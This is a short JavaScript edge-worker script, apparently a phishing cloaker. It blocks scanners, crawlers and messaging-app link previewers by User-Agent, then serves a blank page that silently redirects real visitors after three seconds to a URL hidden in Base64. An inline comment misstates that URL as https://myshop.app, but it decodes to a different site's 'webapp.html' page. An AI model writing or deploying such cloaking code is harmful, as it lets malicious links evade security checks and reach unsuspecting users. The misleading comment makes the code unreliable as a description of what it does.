export default {
  async fetch(request) {
    const url = new URL(request.url);
    const userAgent = request.headers.get("User-Agent") || "";

    // === BOT BLOCKING ===
    const blockedBots = [
      "bot", "crawler", "spider", "slurp", "scraper", "headless", "selenium",
      "curl", "python", "requests", "http-client", "facebookexternalhit",
      "whatsapp", "telegram", "discord", "zgrab", "semrush", "ahrefs", "mj12bot"
    ];

    if (blockedBots.some(bot => userAgent.toLowerCase().includes(bot))) {
      return new Response("Access denied", { status: 403 });
    }

    // === Target URL encoded in Base64 ===
    const targetBase64 = "aHR0cHM6Ly9yZW5la2l0emVuLmNvbS93ZWJhcHAuaHRtbA=="; // Base64 of https://myshop.app

    // Decode Base64
    const targetUrl = atob(targetBase64);

    // HTML that redirects silently after 3 seconds
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body { background: #ffffff; margin: 0; padding: 0; overflow: hidden; }
    </style>
</head>
<body>
    <script>
        // Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = "${targetUrl}";
        }, 3000);
    </script>
</body>
</html>`;

    return new Response(html, {
      headers: {
        "Content-Type": "text/html;charset=UTF-8",
        "Cache-Control": "no-store, no-cache, must-revalidate",
      },
    });
  },
};
